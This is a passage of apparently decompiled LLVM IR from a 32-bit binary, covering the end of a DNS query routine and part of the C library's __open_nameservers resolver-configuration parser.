  %v1_10025cf0 = add i32 %v0_10025cf0, 1
  store i32 %v1_10025cf0, i32* @r18, align 4
  br label %dec_label_pc_10025cf4

dec_label_pc_10025cf4:                            ; preds = %dec_label_pc_10025cdc, %dec_label_pc_10025cf0
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10025cf8thread-pre-split.backedge

dec_label_pc_100257ec.lr.ph:                      ; preds = %dec_label_pc_100257ec.lr.ph.lr.ph, %dec_label_pc_10025cf8thread-pre-split.backedge
  br label %dec_label_pc_100257ec

dec_label_pc_10025d04:                            ; preds = %dec_label_pc_10025764, %dec_label_pc_1002575c, %dec_label_pc_10025754, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10025d10

dec_label_pc_10025d10:                            ; preds = %dec_label_pc_10025cf8thread-pre-split.backedge, %dec_label_pc_100257fc, %dec_label_pc_100258d8, %dec_label_pc_1002599c, %dec_label_pc_10025770, %dec_label_pc_10025d04
  %v0_10025d10 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10025d18 = inttoptr i32 %v0_10025d10 to i32*
  store i32 -1, i32* %v2_10025d18, align 4
  %v0_10025d1c = load i32, i32* @r25, align 4
  store i32 %v0_10025d1c, i32* @r20, align 4
  br label %dec_label_pc_10025d20

dec_label_pc_10025d20:                            ; preds = %dec_label_pc_10025abc, %dec_label_pc_10025d10
  %v0_10025d20 = load i32, i32* @r19, align 4
  %v3_10025d20 = icmp eq i32 %v0_10025d20, -1
  br i1 %v3_10025d20, label %dec_label_pc_10025d30, label %dec_label_pc_10025d28

dec_label_pc_10025d28:                            ; preds = %dec_label_pc_10025d20
  store i32 268590384, i32* @lr, align 4
  %v1_10025d2c = call i32 @__libc_close(i32 %v0_10025d20)
  br label %dec_label_pc_10025d30

dec_label_pc_10025d30:                            ; preds = %dec_label_pc_10025d20, %dec_label_pc_10025d28
  %v0_10025d30 = load i32, i32* @r21, align 4
  store i32 %v0_10025d30, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268590396, i32* @lr, align 4
  %v0_10025d38 = call i32 @free()
  %v0_10025d3c = load i32, i32* @r30, align 4
  store i32 %v0_10025d3c, i32* @r3, align 4
  store i32 268590404, i32* @lr, align 4
  %v0_10025d40 = call i32 @free()
  %v0_10025d44 = load i32, i32* @r26, align 4
  %v3_10025d44 = icmp eq i32 %v0_10025d44, -1
  br i1 %v3_10025d44, label %dec_label_pc_10025d90, label %dec_label_pc_10025d4c

dec_label_pc_10025d4c:                            ; preds = %dec_label_pc_10025d30
  store i32 ptrtoint (i32* @global_var_1004db38.1363 to i32), i32* @r29, align 4
  %v2_10025d58 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10025d60

dec_label_pc_10025d60:                            ; preds = %dec_label_pc_10025c5c, %dec_label_pc_10025d4c
  %storemerge68 = phi i32 [ %v2_10025d58, %dec_label_pc_10025d4c ], [ %v2_10025790, %dec_label_pc_10025c5c ]
  %v1_10025d64.pre-phi = phi i32 [ %v2_10025d58, %dec_label_pc_10025d4c ], [ %v2_10025790, %dec_label_pc_10025c5c ]
  store i32 %storemerge68, i32* @r28, align 4
  %v4_10025d68 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 ptrtoint (i32* @global_var_1004db38.1363 to i32), i32 ptrtoint (i32* @global_var_1004db38.1363 to i32))
  %v0_10025d6c = load i32, i32* @r29, align 4
  store i32 268590452, i32* @lr, align 4
  %v1_10025d70 = call i32 @pthread_mutex_lock(i32 %v0_10025d6c)
  %v0_10025d78 = load i32, i32* @r26, align 4
  store i32 %v0_10025d78, i32* @global_var_10045268.1364, align 4
  store i32 %v1_10025d64.pre-phi, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10025d88 = load i32, i32* @r20, align 4
  %v1_10025d88 = trunc i32 %v0_10025d88 to i16
  store i16 %v1_10025d88, i16* @global_var_10045064.1365, align 2
  store i32 268590480, i32* @lr, align 4
  %v0_10025d8c = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10025d90

dec_label_pc_10025d90:                            ; preds = %dec_label_pc_10025d30, %dec_label_pc_10025d60
  store i32 %v0_10025710, i32* %r0.global-to-local, align 4
  %v0_10025d94 = load i32, i32* @r27, align 4
  ret i32 %v0_10025d94

; uselistorder directives
  uselistorder i32 %v2_10025ce0, { 1, 0 }
  uselistorder i32 %v0_10025c54, { 1, 0 }
  uselistorder i32 %v1_10025c30, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10025afc, { 1, 0 }
  uselistorder i32 %v1_10025c20, { 1, 0 }
  uselistorder i32 %v0_10025be8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10025bac, { 1, 0 }
  uselistorder i32 %v0_10025b60, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v0_10025b38, { 2, 1, 0 }
  uselistorder i32 %v0_10025ad4, { 1, 0 }
  uselistorder i32 %v2_10025ac8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_100259ec, { 1, 0 }
  uselistorder i32 %v1_100258ec, { 1, 0 }
  uselistorder i32 %v1_100258c0, { 1, 0 }
  uselistorder i32 %v1_1002588c, { 1, 0 }
  uselistorder i32 %v1_10025824, { 1, 0 }
  uselistorder i32 %v2_10025790, { 0, 1, 4, 5, 2, 3, 6, 7, 8 }
  uselistorder i32* %stack_var_-228, { 4, 5, 1, 2, 3, 0, 6 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r28.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_poll, { 0, 3, 2, 1 }
  uselistorder i32 101, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 3, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 2 }
  uselistorder i32 53, { 6, 0, 3, 1, 4, 2, 5 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 11, 10, 9, 8, 7, 6, 1, 0, 5, 4, 3 }
  uselistorder i16* @global_var_10045064.1365, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004db38.1363 to i32), { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 268763136, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 1025, { 2, 3, 1, 7, 0, 4, 5, 6 }
  uselistorder i32 512, { 4, 8, 3, 9, 10, 11, 12, 13, 0, 5, 1, 6, 2, 7 }
  uselistorder label %dec_label_pc_10025d90, { 1, 0 }
  uselistorder label %dec_label_pc_10025d60, { 1, 0 }
  uselistorder label %dec_label_pc_10025d30, { 1, 0 }
  uselistorder label %dec_label_pc_10025d20, { 1, 0 }
  uselistorder label %dec_label_pc_10025d10, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_100257ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10025cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10025cdc, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10025cf8thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025c84, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10025c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10025c38, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10025c30, { 1, 0 }
  uselistorder label %dec_label_pc_10025c1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10025b88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10025ac4, { 1, 0 }
  uselistorder label %dec_label_pc_10025abc, { 1, 0 }
  uselistorder label %dec_label_pc_10025960, { 1, 0 }
  uselistorder label %dec_label_pc_100258d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100257fc, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* @r29, align 4
  %v2_10025dc4 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10025dc4, i32* %r3.global-to-local, align 4
  %v4_10025dd0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-200, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v0_10025dd4 = load i32, i32* @r29, align 4
  store i32 %v0_10025dd4, i32* %r3.global-to-local, align 4
  store i32 268590556, i32* @lr, align 4
  %v1_10025dd8 = call i32 @pthread_mutex_lock(i32 %v0_10025dd4)
  store i32 %v1_10025dd8, i32* %r3.global-to-local, align 4
  %v3_10025de0 = load i32, i32* @global_var_1004526c.1212, align 4
  %v2_10025de4 = icmp sgt i32 %v3_10025de0, 0
  br i1 %v2_10025de4, label %dec_label_pc_1002605c, label %dec_label_pc_10025dec

dec_label_pc_10025dec:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1002fb30.1377 to i32), i32* %r3.global-to-local, align 4
  store i32 268590596, i32* @lr, align 4
  %v3_10025e00 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1002fb30.1377 to i32), i32 ptrtoint (i32* @global_var_1002fb18.1347 to i32))
  store i32 %v3_10025e00, i32* %r3.global-to-local, align 4
  store i32 %v3_10025e00, i32* @r26, align 4
  %v3_10025e04 = icmp eq i32 %v3_10025e00, 0
  br i1 %v3_10025e04, label %dec_label_pc_10025e0c, label %dec_label_pc_10026020.preheader

dec_label_pc_10025e0c:                            ; preds = %dec_label_pc_10025dec
  %v0_10025e10 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1002fb44.1378 to i32), i32* %r3.global-to-local, align 4
  store i32 268590620, i32* @lr, align 4
  %v3_10025e18 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1002fb44.1378 to i32), i32 %v0_10025e10)
  store i32 %v3_10025e18, i32* %r3.global-to-local, align 4
  store i32 %v3_10025e18, i32* @r26, align 4
  %v3_10025e1c = icmp eq i32 %v3_10025e18, 0
  br i1 %v3_10025e1c, label %dec_label_pc_10026050, label %dec_label_pc_10026020.preheader

dec_label_pc_10026020.preheader:                  ; preds = %dec_label_pc_10025dec, %dec_label_pc_10025e0c
  %v0_1002602c16 = phi i32 [ %v3_10025e00, %dec_label_pc_10025dec ], [ %v3_10025e18, %dec_label_pc_10025e0c ]
  %v2_10026020 = ptrtoint i32* %stack_var_-164 to i32
  %v1_10025e2c2 = bitcast i32* %stack_var_-164 to i8*
  %v3_10025f10 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10026020

dec_label_pc_10025e28:                            ; preds = %dec_label_pc_10025e40
  %v1_10025e28 = add i32 %v0_10025ee89, 1
  store i32 %v1_10025e28, i32* %r3.global-to-local, align 4
  %v1_10025e2c = inttoptr i32 %v1_10025e28 to i8*
  %v2_10025e2c = load i8, i8* %v1_10025e2c, align 1
  %v3_10025e2c = zext i8 %v2_10025e2c to i32
  store i32 %v3_10025e2c, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_10025e34 = icmp eq i8 %v2_10025e2c, 0
  %v1_10025e38 = mul nuw nsw i32 %v3_10025e2c, 2
  store i32 %v1_10025e38, i32* @r10, align 4
  br i1 %v3_10025e34, label %dec_label_pc_10026020.backedge, label %dec_label_pc_10025e40

dec_label_pc_10025e40:                            ; preds = %dec_label_pc_10025e40.lr.ph, %dec_label_pc_10025e28
  %v0_10025e58 = phi i32 [ %v3_10025e2c4, %dec_label_pc_10025e40.lr.ph ], [ %v3_10025e2c, %dec_label_pc_10025e28 ]
  %v0_10025ee89 = phi i32 [ %v2_10026020, %dec_label_pc_10025e40.lr.ph ], [ %v1_10025e28, %dec_label_pc_10025e28 ]
  %v0_10025e44 = phi i32 [ %v1_10025e388, %dec_label_pc_10025e40.lr.ph ], [ %v1_10025e38, %dec_label_pc_10025e28 ]
  %v2_10025e44 = add i32 %v0_10025e44, %v3_10025e40.pre
  %v3_10025e44 = inttoptr i32 %v2_10025e44 to i16*
  %v4_10025e44 = load i16, i16* %v3_10025e44, align 2
  %v1_10025e48 = and i16 %v4_10025e44, 32
  %v3_10025e48 = icmp eq i16 %v1_10025e48, 0
  br i1 %v3_10025e48, label %dec_label_pc_10025e50, label %dec_label_pc_10025e28

dec_label_pc_10025e50:                            ; preds = %dec_label_pc_10025e40
  %v3_10025e50 = icmp eq i32 %v0_10025e58, 10
  br i1 %v3_10025e50, label %dec_label_pc_10026020.backedge, label %dec_label_pc_10025e58

dec_label_pc_10026020.backedge:                   ; preds = %dec_label_pc_10025e28, %dec_label_pc_10025fd4, %dec_label_pc_10025fdc, %dec_label_pc_10026014, %dec_label_pc_10025e2c.preheader, %dec_label_pc_10025e50, %dec_label_pc_10025e58, %dec_label_pc_10025f7c
  %v0_1002602c.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10026020

dec_label_pc_10025e58:                            ; preds = %dec_label_pc_10025e50
  %v3_10025e58 = icmp eq i32 %v0_10025e58, 35
  br i1 %v3_10025e58, label %dec_label_pc_10026020.backedge, label %dec_label_pc_10025e60

dec_label_pc_10025e60:                            ; preds = %dec_label_pc_10025e58
  store i32 268697600, i32* @r10, align 4
  store i32 0, i32* @r27, align 4
  store i32 %v2_10025dc4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_10025ee810 = inttoptr i32 %v0_10025ee89 to i8*
  %v2_10025ee811 = load i8, i8* %v1_10025ee810, align 1
  %v3_10025eec14 = icmp eq i8 %v2_10025ee811, 0
  br i1 %v3_10025eec14, label %dec_label_pc_10025efc, label %dec_label_pc_10025ef4

dec_label_pc_10025e74:                            ; preds = %dec_label_pc_10025ef4
  %v3_10025e74 = load i32, i32* @global_var_1004513c, align 4
  store i32 %v3_10025e74, i32* %r11.global-to-local, align 4
  %v1_10025e78 = mul i32 %v0_10025e78, 4
  %v1_10025e7c = load i32, i32* %r6.global-to-local, align 4
  %v2_10025e7c = add i32 %v1_10025e7c, %v1_10025e78
  %v2_10025e80 = add i32 %v2_10025e7c, 16
  %v3_10025e80 = inttoptr i32 %v2_10025e80 to i32*
  store i32 %v0_10025e80, i32* %v3_10025e80, align 4
  %v0_10025e8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10025e8c

dec_label_pc_10025e88:                            ; preds = %dec_label_pc_10025ea0
  %v1_10025e88 = add i32 %v0_10025e88, 1
  store i32 %v1_10025e88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10025e8c

dec_label_pc_10025e8c:                            ; preds = %dec_label_pc_10025e74, %dec_label_pc_10025e88
  %v0_10025e88 = phi i32 [ %v0_10025e8c.pre, %dec_label_pc_10025e74 ], [ %v1_10025e88, %dec_label_pc_10025e88 ]
  %v1_10025e8c = inttoptr i32 %v0_10025e88 to i8*
  %v2_10025e8c = load i8, i8* %v1_10025e8c, align 1
  %v3_10025e90 = icmp eq i8 %v2_10025e8c, 0
  br i1 %v3_10025e90, label %dec_label_pc_10025ebc, label %dec_label_pc_10025ea0

dec_label_pc_10025ea0:                            ; preds = %dec_label_pc_10025e8c
  %v3_10025e98 = icmp eq i8 %v2_10025e8c, 10
  %v3_10025e8c = zext i8 %v2_10025e8c to i32
  %v1_10025e94 = mul nuw nsw i32 %v3_10025e8c, 2
  %v1_10025ea0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10025ea0 = add i32 %v1_10025ea0, %v1_10025e94
  %v3_10025ea0 = inttoptr i32 %v2_10025ea0 to i16*
  %v4_10025ea0 = load i16, i16* %v3_10025ea0, align 2
  %v1_10025ea4 = and i16 %v4_10025ea0, 32
  %v3_10025ea4.not = icmp ne i16 %v1_10025ea4, 0
  %brmerge = or i1 %v3_10025e98, %v3_10025ea4.not
  br i1 %brmerge, label %dec_label_pc_10025ebc, label %dec_label_pc_10025e88

dec_label_pc_10025eb4:                            ; preds = %dec_label_pc_10025ed0
  %v0_10025eb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10025eb4 = trunc i32 %v0_10025eb4 to i8
  store i8 %v1_10025eb4, i8* %v1_10025ebc, align 1
  %v0_10025eb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10025eb8 = add i32 %v0_10025eb8, 1
  store i32 %v1_10025eb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10025ebc

dec_label_pc_10025ebc:                            ; preds = %dec_label_pc_10025ea0, %dec_label_pc_10025e8c, %dec_label_pc_10025eb4
  %v0_10025ee8 = phi i32 [ %v1_10025eb8, %dec_label_pc_10025eb4 ], [ %v0_10025e88, %dec_label_pc_10025e8c ], [ %v0_10025e88, %dec_label_pc_10025ea0 ]
  %v1_10025ebc = inttoptr i32 %v0_10025ee8 to i8*
  %v2_10025ebc = load i8, i8* %v1_10025ebc, align 1
  %v3_10025ebc = zext i8 %v2_10025ebc to i32
  %v3_10025ec0 = icmp eq i8 %v2_10025ebc, 0
  %v1_10025ec4 = mul nuw nsw i32 %v3_10025ebc, 2
  store i32 %v1_10025ec4, i32* %r11.global-to-local, align 4
  br i1 %v3_10025ec0, label %dec_label_pc_10025ee4, label %dec_label_pc_10025ed0

dec_label_pc_10025ed0:                            ; preds = %dec_label_pc_10025ebc
  %v3_10025ec8 = icmp eq i8 %v2_10025ebc, 10
  %v3_10025ed0 = load i32, i32* @global_var_1004513c, align 4
  %v2_10025ed4 = add i32 %v3_10025ed0, %v1_10025ec4
  %v3_10025ed4 = inttoptr i32 %v2_10025ed4 to i16*
  %v4_10025ed4 = load i16, i16* %v3_10025ed4, align 2
  %v1_10025ed8 = and i16 %v4_10025ed4, 32
  %v3_10025ed8.not = icmp ne i16 %v1_10025ed8, 0
  %brmerge27 = or i1 %v3_10025ec8, %v3_10025ed8.not
  br i1 %brmerge27, label %dec_label_pc_10025eb4, label %dec_label_pc_10025ee4

dec_label_pc_10025ee4:                            ; preds = %dec_label_pc_10025ed0, %dec_label_pc_10025ebc
  %v0_10025ee4 = load i32, i32* @r27, align 4
  %v1_10025ee4 = add i32 %v0_10025ee4, 1
  store i32 %v1_10025ee4, i32* @r27, align 4
  %v2_10025ee8 = load i8, i8* %v1_10025ebc, align 1
  %v3_10025eec = icmp eq i8 %v2_10025ee8, 0
  br i1 %v3_10025eec, label %dec_label_pc_10025efc, label %dec_label_pc_10025ef4

dec_label_pc_10025ef4:                            ; preds = %dec_label_pc_10025e60, %dec_label_pc_10025ee4
  %v0_10025e80 = phi i32 [ %v0_10025ee8, %dec_label_pc_10025ee4 ], [ %v0_10025ee89, %dec_label_pc_10025e60 ]
  %v0_10025e78 = phi i32 [ %v1_10025ee4, %dec_label_pc_10025ee4 ], [ 0, %dec_label_pc_10025e60 ]
  %tmp33 = icmp slt i32 %v0_10025e78, 5
  br i1 %tmp33, label %dec_label_pc_10025e74, label %dec_label_pc_10025efc

dec_label_pc_10025efc:                            ; preds = %dec_label_pc_10025ee4, %dec_label_pc_10025ef4, %dec_label_pc_10025e60
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1002fb5c.1379 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10025f10 = call i32 @__GI_strcoll(i8* %v3_10025f10, i32 ptrtoint ([11 x i8]* @global_var_1002fb5c.1379 to i32))
  store i32 %v4_10025f10, i32* %r3.global-to-local, align 4
  %v3_10025f14 = icmp eq i32 %v4_10025f10, 0
  br i1 %v3_10025f14, label %dec_label_pc_10025f40, label %dec_label_pc_10025f64

dec_label_pc_10025f20:                            ; preds = %dec_label_pc_10025f58
  %v1_10025f20 = add i32 %v2_10025f48, 24
  %v2_10025f20 = inttoptr i32 %v1_10025f20 to i32*
  %v3_10025f20 = load i32, i32* %v2_10025f20, align 4
  store i32 %v3_10025f20, i32* %r3.global-to-local, align 4
  store i32 268590888, i32* @lr, align 4
  %v1_10025f24 = call i32 @__GI_strdup(i32 %v3_10025f20)
  store i32 %v1_10025f24, i32* %r3.global-to-local, align 4
  %v0_10025f2c = load i32, i32* @r29, align 4
  %v1_10025f2c = add i32 %v0_10025f2c, 1
  store i32 %v1_10025f2c, i32* %r11.global-to-local, align 4
  %v1_10025f30 = mul i32 %v0_10025f2c, 4
  store i32 %v1_10025f2c, i32* @global_var_1004526c.1212, align 4
  %v3_10025f3c = add i32 %v1_10025f30, ptrtoint (i32* @global_var_1004eee4.1213 to i32)
  %v4_10025f3c = inttoptr i32 %v3_10025f3c to i32*
  store i32 %v1_10025f24, i32* %v4_10025f3c, align 4
  br label %dec_label_pc_10025f40

dec_label_pc_10025f40:                            ; preds = %dec_label_pc_10025efc, %dec_label_pc_10025f20
  %v0_10025f40 = load i32, i32* @r31, align 4
  %v1_10025f40 = load i32, i32* @r27, align 4
  %v2_10025f40 = icmp slt i32 %v0_10025f40, %v1_10025f40
  %v1_10025f44 = mul i32 %v0_10025f40, 4
  %v0_10025f48 = load i32, i32* @r1, align 4
  %v2_10025f48 = add i32 %v0_10025f48, %v1_10025f44
  br i1 %v2_10025f40, label %dec_label_pc_10025f58, label %dec_label_pc_10025f64

dec_label_pc_10025f58:                            ; preds = %dec_label_pc_10025f40
  %v3_10025f58 = load i32, i32* @global_var_1004526c.1212, align 4
  %tmp35 = icmp slt i32 %v3_10025f58, 3
  br i1 %tmp35, label %dec_label_pc_10025f20, label %dec_label_pc_10025f64

dec_label_pc_10025f64:                            ; preds = %dec_label_pc_10025f58, %dec_label_pc_10025f40, %dec_label_pc_10025efc
  %v0_10025f68 = load i32, i32* @r30, align 4
  store i32 %v0_10025f68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002fb68.1380 to i32), i32* @r4, align 4
  %v3_10025f70 = inttoptr i32 %v0_10025f68 to i8*
  %v4_10025f70 = call i32 @__GI_strcoll(i8* %v3_10025f70, i32 ptrtoint ([7 x i8]* @global_var_1002fb68.1380 to i32))
  store i32 %v4_10025f70, i32* %r3.global-to-local, align 4
  %v3_10025f74 = icmp eq i32 %v4_10025f70, 0
  br i1 %v3_10025f74, label %dec_label_pc_10025fb4.preheader, label %dec_label_pc_10025f7c

dec_label_pc_10025f7c:                            ; preds = %dec_label_pc_10025f64
  %v0_10025f80 = load i32, i32* @r30, align 4
  store i32 %v0_10025f80, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002fb70.1381 to i32), i32* @r4, align 4
  %v3_10025f88 = inttoptr i32 %v0_10025f80 to i8*
  %v4_10025f88 = call i32 @__GI_strcoll(i8* %v3_10025f88, i32 ptrtoint ([7 x i8]* @global_var_1002fb70.1381 to i32))
  store i32 %v4_10025f88, i32* %r3.global-to-local, align 4
  %v3_10025f8c = icmp eq i32 %v4_10025f88, 0
  br i1 %v3_10025f8c, label %dec_label_pc_10025fb4.preheader, label %dec_label_pc_10026020.backedge

dec_label_pc_10025fb4.preheader:                  ; preds = %dec_label_pc_10025f64, %dec_label_pc_10025f7c
  store i32 ptrtoint (i32* @global_var_1004eed4.1369 to i32), i32* @r31, align 4
  %v3_10025fc041 = load i32, i32* @global_var_10045270.1367, align 4
  %v2_10025fc443 = icmp sgt i32 %v3_10025fc041, 0
  %v1_10025fc845 = add i32 %v3_10025fc041, -1
  %v1_10025fcc46 = mul i32 %v1_10025fc845, 4
  store i32 %v1_10025fcc46, i32* %r11.global-to-local, align 4
  br i1 %v2_10025fc443, label %dec_label_pc_10025f98, label %dec_label_pc_10025fd4

dec_label_pc_10025f98:                            ; preds = %dec_label_pc_10025fb4.preheader, %dec_label_pc_10025f98
  %v1_10025fcc48 = phi i32 [ %v1_10025fcc, %dec_label_pc_10025f98 ], [ %v1_10025fcc46, %dec_label_pc_10025fb4.preheader ]
  %v1_10025fc847 = phi i32 [ %v1_10025fc8, %dec_label_pc_10025f98 ], [ %v1_10025fc845, %dec_label_pc_10025fb4.preheader ]
  %v2_10025f98 = add i32 %v1_10025fcc48, ptrtoint (i32* @global_var_1004eed4.1369 to i32)
  %v3_10025f98 = inttoptr i32 %v2_10025f98 to i32*
  %v4_10025f98 = load i32, i32* %v3_10025f98, align 4
  store i32 %v4_10025f98, i32* @r3, align 4
  store i32 %v1_10025fc847, i32* @global_var_10045270.1367, align 4
  store i32 268591012, i32* @lr, align 4
  %v0_10025fa0 = call i32 @free()
  store i32 %v0_10025fa0, i32* %r3.global-to-local, align 4
  %v3_10025fa4 = load i32, i32* @global_var_10045270.1367, align 4
  %v1_10025fac = mul i32 %v3_10025fa4, 4
  %v1_10025fb0 = load i32, i32* @r31, align 4
  %v3_10025fb0 = add i32 %v1_10025fb0, %v1_10025fac
  %v4_10025fb0 = inttoptr i32 %v3_10025fb0 to i32*
  store i32 0, i32* %v4_10025fb0, align 4
  store i32 ptrtoint (i32* @global_var_1004eed4.1369 to i32), i32* @r31, align 4
  %v3_10025fc0 = load i32, i32* @global_var_10045270.1367, align 4
  %v2_10025fc4 = icmp sgt i32 %v3_10025fc0, 0
  %v1_10025fc8 = add i32 %v3_10025fc0, -1
  %v1_10025fcc = mul i32 %v1_10025fc8, 4
  store i32 %v1_10025fcc, i32* %r11.global-to-local, align 4
  br i1 %v2_10025fc4, label %dec_label_pc_10025f98, label %dec_label_pc_10025fd4

dec_label_pc_10025fd4:                            ; preds = %dec_label_pc_10025f98, %dec_label_pc_10025fb4.preheader
  %v3_1002601459 = phi i32 [ %v3_10025fc041, %dec_label_pc_10025fb4.preheader ], [ %v3_10025fc0, %dec_label_pc_10025f98 ]
  %v1_10025ffc49 = load i32, i32* @r27, align 4
  %v2_10025ffc50 = icmp sgt i32 %v1_10025ffc49, 1
  %v0_1002600453 = load i32, i32* @r1, align 4
  %v2_1002600454 = add i32 %v0_1002600453, 4
  br i1 %v2_10025ffc50, label %dec_label_pc_10026014, label %dec_label_pc_10026020.backedge

dec_label_pc_10025fdc:                            ; preds = %dec_label_pc_10026014
  %v1_10025fdc = add i32 %v2_1002600455, 24
  %v2_10025fdc = inttoptr i32 %v1_10025fdc to i32*
  %v3_10025fdc = load i32, i32* %v2_10025fdc, align 4
  store i32 %v3_10025fdc, i32* %r3.global-to-local, align 4
  store i32 268591076, i32* @lr, align 4
  %v1_10025fe0 = call i32 @__GI_strdup(i32 %v3_10025fdc)
  store i32 %v1_10025fe0, i32* %r3.global-to-local, align 4
  %v0_10025fe8 = load i32, i32* @r29, align 4
  %v1_10025fe8 = add i32 %v0_10025fe8, 1
  store i32 %v1_10025fe8, i32* %r11.global-to-local, align 4
  %v1_10025fec = mul i32 %v0_10025fe8, 4
  store i32 %v1_10025fe8, i32* @global_var_10045270.1367, align 4
  %v3_10025ff8 = add i32 %v1_10025fec, ptrtoint (i32* @global_var_1004eed4.1369 to i32)
  %v4_10025ff8 = inttoptr i32 %v3_10025ff8 to i32*
  store i32 %v1_10025fe0, i32* %v4_10025ff8, align 4
  %v0_10025ffc.pre = load i32, i32* @r31, align 4
  %v1_10025ffc = load i32, i32* @r27, align 4
  %v2_10025ffc = icmp slt i32 %v0_10025ffc.pre, %v1_10025ffc
  br i1 %v2_10025ffc, label %dec_label_pc_10025fdc.dec_label_pc_10026014_crit_edge, label %dec_label_pc_10026020.backedge

dec_label_pc_10025fdc.dec_label_pc_10026014_crit_edge: ; preds = %dec_label_pc_10025fdc
  %v0_10026004 = load i32, i32* @r1, align 4
  %v1_10026000 = mul i32 %v0_10025ffc.pre, 4
  %v2_10026004 = add i32 %v0_10026004, %v1_10026000
  %v3_10026014.pre = load i32, i32* @global_var_10045270.1367, align 4
  br label %dec_label_pc_10026014

dec_label_pc_10026014:                            ; preds = %dec_label_pc_10025fd4, %dec_label_pc_10025fdc.dec_label_pc_10026014_crit_edge
  %v3_10026014 = phi i32 [ %v3_10026014.pre, %dec_label_pc_10025fdc.dec_label_pc_10026014_crit_edge ], [ %v3_1002601459, %dec_label_pc_10025fd4 ]
  %v2_1002600455 = phi i32 [ %v2_10026004, %dec_label_pc_10025fdc.dec_label_pc_10026014_crit_edge ], [ %v2_1002600454, %dec_label_pc_10025fd4 ]
  %tmp37 = icmp slt i32 %v3_10026014, 4
